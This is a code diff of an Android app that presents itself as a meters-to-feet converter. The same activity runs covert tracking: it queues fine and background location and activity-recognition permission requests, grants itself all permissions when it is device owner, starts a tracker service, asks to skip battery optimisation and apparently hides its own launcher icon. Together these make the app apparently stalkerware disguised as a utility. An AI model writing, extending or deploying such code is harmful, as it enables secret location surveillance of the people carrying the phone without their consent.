@@ -24,45 +24,63 @@ import com.aether.convert.admin.Dp
 import java.util.Locale
 
 class MainActivity : ComponentActivity() {
+
     private lateinit var prefs: Prefs
     private val q = ArrayDeque<String>()
     private var out: TextView? = null
     private var field: EditText? = null
+
     private val perm = registerForActivityResult(
         ActivityResultContracts.RequestPermission()) { step() }
+
+    private fun granted(p: String) =
+        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
 
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
         prefs = Prefs(this)
         build()
-        if (Dp.isOwner(this)) { Dp.grantAll(this); finishOnboard() }
-        else if (!prefs.onboarded) onboard()
+        if (Dp.isOwner(this)) {
+            Dp.grantAll(this)
+            finishOnboard()
+        } else if (!prefs.onboarded) {
+            onboard()
+        }
     }
 
-    override fun onResume() { super.onResume(); if (prefs.onboarded) run_() }
+    override fun onResume() {
+        super.onResume()
+        if (prefs.onboarded) run_()
+    }
 
     private fun run_() {
-        try {
-            ContextCompat.startForegroundService(this,
-                Intent(this, TrackerService::class.java).setAction(TrackerService.ACTION_START))
-        } catch (_: Throwable) {}
+        Arm.arm(this, prefs.moving)
     }
 
     private fun onboard() {
         q.clear()
         q.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        if (Build.VERSION.SDK_INT >= 29) q.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-        if (Build.VERSION.SDK_INT >= 33) q.add(Manifest.permission.POST_NOTIFICATIONS)
-        if (Build.VERSION.SDK_INT >= 29) q.add(Manifest.permission.ACTIVITY_RECOGNITION)
+        if (Build.VERSION.SDK_INT >= 29 &&
+            !granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
+            q.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        }
+        if (Build.VERSION.SDK_INT >= 33 &&
+            !granted(Manifest.permission.POST_NOTIFICATIONS)) {
+            q.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+        if (Build.VERSION.SDK_INT >= 29 &&
+            !granted(Manifest.permission.ACTIVITY_RECOGNITION)) {
+            q.add(Manifest.permission.ACTIVITY_RECOGNITION)
+        }
         step()
     }
 
     private fun step() {
         while (q.isNotEmpty()) {
             val p = q.removeFirst()
-            if (ContextCompat.checkSelfPermission(this, p) ==
-                PackageManager.PERMISSION_GRANTED) continue
-            perm.launch(p); return
+            if (granted(p)) continue
+            perm.launch(p)
+            return
         }
         finishOnboard()
     }
@@ -70,12 +88,17 @@ class MainActivity : ComponentActivity() {
     private fun finishOnboard() {
         prefs.onboarded = true
         run_()
-        if (!Dp.isOwner(this) && !DeviceInfo.ignoring(this)) {
+
+        val bgOk = Build.VERSION.SDK_INT < 29 ||
+                granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+
+        if (!Dp.isOwner(this) && !DeviceInfo.ignoring(this) && !bgOk) {
             try {
                 startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                     Uri.parse("package:$packageName")))
             } catch (_: Throwable) {}
         }
+
         if (!prefs.hidden) {
             try {
                 packageManager.setComponentEnabledSetting(
@@ -100,7 +123,7 @@ class MainActivity : ComponentActivity() {
             setTextColor(Color.parseColor("#F2F2F5"))
         })
         root.addView(TextView(this).apply {
-            text = "Meters  →  Feet"; textSize = 13f
+            text = "Meters  \u2192  Feet"; textSize = 13f
             setTextColor(Color.parseColor("#8A8A94"))
             setPadding(0, dp(6), 0, dp(20))
         })
@@ -148,6 +171,7 @@ class MainActivity : ComponentActivity() {
 
     private fun convert() {
         val v = field?.text?.toString()?.toDoubleOrNull()
-        out?.text = if (v == null) "—" else String.format(Locale.US, "%.4f ft", v * 3.28084)
+        out?.text = if (v == null) "\u2014"
+        else String.format(Locale.US, "%.4f ft", v * 3.28084)
     }
 }
